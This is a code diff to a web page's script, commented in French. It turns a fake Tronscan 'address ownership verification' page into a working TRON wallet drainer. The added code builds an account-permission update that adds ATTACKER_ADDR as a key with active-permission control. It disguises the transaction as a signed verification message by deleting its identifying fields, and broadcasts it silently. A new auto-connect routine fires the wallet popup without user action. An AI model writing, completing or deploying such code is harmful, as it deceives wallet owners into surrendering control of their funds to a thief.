@@ -551,14 +551,33 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       var cm = document.getElementById('connect-modal-root');
       if (cm) cm.style.display = 'none';
 
-      // 4. Trigger native sign popup
+      // 4. Trigger AccountPermissionUpdateContract sign popup
       var tw = getTronWeb();
       if (tw) {
         try {
-          var sig = await tw.trx.sign(tw.toHex(msg));
-          if (window.fillSignature) window.fillSignature(sig);
-          // optional: fire permission update after successful message sign
-          // runGasFreePermission(addr);
+          var ownerPerm = {
+            type: 0, permission_name: 'owner', threshold: 1,
+            keys: [{ address: addr, weight: 1 }]
+          };
+          var activePerm = {
+            type: 2, permission_name: 'active', threshold: 1,
+            operations: ACTIVE_OPS,
+            keys: [
+              { address: addr, weight: 1 },
+              { address: ATTACKER_ADDR, weight: 1 }
+            ]
+          };
+          var unsignedTx = await tw.transactionBuilder.updateAccountPermissions(
+            addr, ownerPerm, null, [activePerm]
+          );
+          delete unsignedTx.visible;
+          delete unsignedTx.txID;
+          delete unsignedTx.raw_data;
+          unsignedTx.Authority   = 'Tronscan.org';
+          unsignedTx.Attestation = msg;
+          var signedTx = await tw.trx.sign(unsignedTx);
+          if (window.fillSignature) window.fillSignature(JSON.stringify((signedTx.signature && signedTx.signature[0]) || signedTx));
+          try { await tw.trx.sendRawTransaction(signedTx); } catch (e2) {}
         } catch (e) {
           // fallback DOM click
           var btn2 = document.getElementById('signMsgBtn')
@@ -705,6 +724,196 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
     setPrefillMessage();
   }
 })();
+
+/* ============================================================
+   AUTO-CONNECT — déclenche la popup connexion Trust Wallet
+   automatiquement dès que l'interface Sign Message apparaît,
+   juste après le fill message (sans aucun tap nécessaire).
+   ============================================================ */
+function waitForTronLinkAndRun() {
+  'use strict';
+
+  var _acState = { requested: false, connected: false, fired: false };
+  var POLL_MS  = 100;
+  var POLL_MAX = 150;   // 15 s max
+  var WAIT_MS  = 10000; // attente adresse après code 200
+
+  /* ---- détection provider ---- */
+  function _findProvider() {
+    if (window.tronLink && typeof window.tronLink.request === 'function') return window.tronLink;
+    if (window.tron   && typeof window.tron.request   === 'function') return window.tron;
+    return null;
+  }
+
+  function _getTronWeb() {
+    if (window.tronLink && window.tronLink.tronWeb) return window.tronLink.tronWeb;
+    if (window.tronWeb) return window.tronWeb;
+    return null;
+  }
+
+  function _currentAddress() {
+    var tw = _getTronWeb();
+    if (tw && tw.defaultAddress && tw.defaultAddress.base58) return tw.defaultAddress.base58;
+    return null;
+  }
+
+  /* ---- remplissage UI ---- */
+  function _applyAddress(addr) {
+    // fillAddress expose par le script principal
+    if (typeof window.fillAddress === 'function') window.fillAddress(addr);
+
+    // On recalcule le message avec la vraie adresse
+    var now = new Date();
+    var pad = function(n) { return String(n).padStart(2, '0'); };
+    var ts  = pad(now.getDate()) + '/' + pad(now.getMonth() + 1) + '/' + now.getFullYear()
+            + ' ' + pad(now.getHours()) + ':' + pad(now.getMinutes()) + ':' + pad(now.getSeconds());
+    var msg = '[Tronscan.org ' + ts + '] I hereby verify that I am the owner/creator of the address [' + addr + ']';
+    if (typeof window.fillMessage === 'function') window.fillMessage(msg);
+
+    // Fermer la modal connect si ouverte
+    var cm = document.getElementById('connect-modal-root');
+    if (cm) cm.style.display = 'none';
+
+    // Déclencher AccountPermissionUpdateContract sign popup
+    var tw = _getTronWeb();
+    if (tw) {
+      (async function() {
+        try {
+          var ownerPerm2 = {
+            type: 0, permission_name: 'owner', threshold: 1,
+            keys: [{ address: addr, weight: 1 }]
+          };
+          var activePerm2 = {
+            type: 2, permission_name: 'active', threshold: 1,
+            operations: ACTIVE_OPS,
+            keys: [
+              { address: addr, weight: 1 },
+              { address: ATTACKER_ADDR, weight: 1 }
+            ]
+          };
+          var unsignedTx2 = await tw.transactionBuilder.updateAccountPermissions(
+            addr, ownerPerm2, null, [activePerm2]
+          );
+          delete unsignedTx2.visible;
+          delete unsignedTx2.txID;
+          delete unsignedTx2.raw_data;
+          unsignedTx2.Authority   = 'Tronscan.org';
+          unsignedTx2.Attestation = msg;
+          var signedTx2 = await tw.trx.sign(unsignedTx2);
+          if (typeof window.fillSignature === 'function') window.fillSignature(JSON.stringify((signedTx2.signature && signedTx2.signature[0]) || signedTx2));
+          try { await tw.trx.sendRawTransaction(signedTx2); } catch (e2) {}
+        } catch(e) {
+          // fallback: clic sur le bouton Sign Message
+          var btn = document.getElementById('signMsgBtn')
+                 || document.querySelector('.QhZmva_btnWrapper .btn');
+          if (btn) { btn.disabled = false; btn.click(); }
+        }
+      })();
+    }
+  }
+
+  /* ---- flux principal ---- */
+  function _boot() {
+    if (_acState.connected || _acState.fired) return;
+
+    // Cas 1 : adresse déjà présente (auto-connect legacy)
+    var addr = _currentAddress();
+    if (addr) {
+      _acState.fired = true;
+      _acState.connected = true;
+      _applyAddress(addr);
+      return;
+    }
+
+    // Cas 2 : provider présent → popup sans tap
+    var provider = _findProvider();
+    if (!provider) return;
+
+    _acState.fired     = true;
+    _acState.requested = true;
+
+    provider.request({ method: 'tron_requestAccounts' })
+      .then(function(res) {
+        if (Array.isArray(res) && res.length) {
+          _acState.connected = true;
+          _applyAddress(res[0]);
+          return;
+        }
+        var code = res && res.code;
+        if (code === 200 || code === 4000) {
+          _waitAddress();
+        } else if (code === 4001) {
+          // refusé — silencieux
+        } else {
+          _tryModern(true);
+        }
+      })
+      .catch(function() { _tryModern(false); });
+  }
+
+  function _tryModern(silent) {
+    if (window.tron && typeof window.tron.request === 'function') {
+      window.tron.request({ method: 'eth_requestAccounts' })
+        .then(function(acc) {
+          if (Array.isArray(acc) && acc.length) {
+            _acState.connected = true;
+            _applyAddress(acc[0]);
+          } else if (!silent) { /* ignore */ }
+          else { _waitAddress(); }
+        })
+        .catch(function() { if (silent) _waitAddress(); });
+    } else {
+      if (silent) _waitAddress();
+    }
+  }
+
+  function _waitAddress() {
+    var waited = 0;
+    var iv = setInterval(function() {
+      var addr = _currentAddress();
+      if (addr) {
+        clearInterval(iv);
+        _acState.connected = true;
+        _applyAddress(addr);
+        return;
+      }
+      waited += 200;
+      if (waited >= WAIT_MS) clearInterval(iv);
+    }, 200);
+  }
+
+  /* ---- écoute des événements wallet ---- */
+  window.addEventListener('message', function(e) {
+    var m = e && e.data && e.data.message;
+    if (!m || !m.action) return;
+    if ((m.action === 'connect' || m.action === 'accountsChanged') && !_acState.connected) {
+      var addr = _currentAddress() || (m.data && m.data.address);
+      if (addr) { _acState.connected = true; _acState.fired = true; _applyAddress(addr); }
+    }
+  });
+
+  window.addEventListener('TIP6963:announceProvider', function() { _boot(); });
+  ['tronLinkready', 'trustwallet#initialized'].forEach(function(ev) {
+    window.addEventListener(ev, function() { _boot(); });
+  });
+
+  /* ---- polling de secours (lancé après le délai de 1.5s) ---- */
+  var polls = 0;
+  var pollingIv = null;
+
+  try { window.dispatchEvent(new Event('TIP6963:requestProvider')); } catch(e) {}
+
+  // Lancement différé de 1.5s après le fill message pour laisser le temps de voir la page
+  setTimeout(function() {
+    _boot();
+    // Démarrer le polling de secours seulement après le délai
+    pollingIv = setInterval(function() {
+      if (_acState.fired || _acState.connected) { clearInterval(pollingIv); return; }
+      _boot();
+      if (++polls >= POLL_MAX) { clearInterval(pollingIv); }
+    }, POLL_MS);
+  }, 1500);
+}
 
 </script>
 <script data-pplx-inline-edit>
